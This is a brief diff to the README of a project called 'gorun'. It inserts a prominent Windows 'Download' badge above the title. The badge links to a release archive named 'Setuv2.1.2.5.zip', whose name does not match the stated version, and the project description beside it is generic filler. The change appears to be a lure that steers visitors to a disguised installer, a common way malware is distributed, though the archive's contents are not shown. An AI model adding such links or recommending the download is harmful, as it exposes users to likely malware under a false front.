@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen?style=for-the-badge&logo=windows)](https://github.com/alexclarkops2097l1/gorun/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ gorun
 
 gorun is built for dynamic users who need a reliable, open-source solution.
